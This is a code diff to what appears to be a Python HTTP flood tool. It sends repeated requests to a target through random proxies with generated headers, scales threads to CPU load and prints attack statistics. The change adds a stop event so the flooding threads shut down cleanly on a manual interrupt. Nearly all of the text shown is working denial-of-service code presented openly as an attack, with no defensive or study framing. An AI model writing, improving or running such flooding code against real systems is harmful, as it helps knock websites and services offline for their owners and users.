@@ -66,14 +66,14 @@ def get_dynamic_threads():
     return threads
 
 # Send flood requests function
-def send_flood(target):
+def send_flood(target, stop_event):
     attempted, success, failed = 0, 0, 0
     peak_rps = 0
     start_time = time.time()
 
     def attack():
         nonlocal attempted, success, failed, peak_rps
-        while True:
+        while not stop_event.is_set():  # Check for stop event to gracefully stop the attack
             headers = generate_headers()
             proxy = random.choice(proxies) if proxies else None
             try:
@@ -102,7 +102,7 @@ def send_flood(target):
     # Dynamically scale threads based on CPU usage
     num_threads = get_dynamic_threads()  # Get the number of threads based on CPU usage
     print(f"Scaling attack to {num_threads} threads.")
-    
+
     # Create threads
     threads = []
     for _ in range(num_threads):
@@ -122,9 +122,11 @@ def run_flood(target):
     print("Starting attack...")
     print(f"Target: {target}")
 
+    stop_event = threading.Event()
+
     try:
         while True:
-            attempted, success, failed, peak_rps, elapsed_time = send_flood(target)
+            attempted, success, failed, peak_rps, elapsed_time = send_flood(target, stop_event)
 
             # Clear terminal periodically and print attack stats
             clear_terminal()
@@ -139,6 +141,7 @@ def run_flood(target):
     except KeyboardInterrupt:
         # Handle manual stop via CTRL+C
         print("\nAttack stopped manually.")
+        stop_event.set()  # Set stop event to gracefully stop threads
         clear_terminal()
         print(f"TOTAL REQUESTS SENT: {attempted}")
         print(f"SUCCES: {success}")
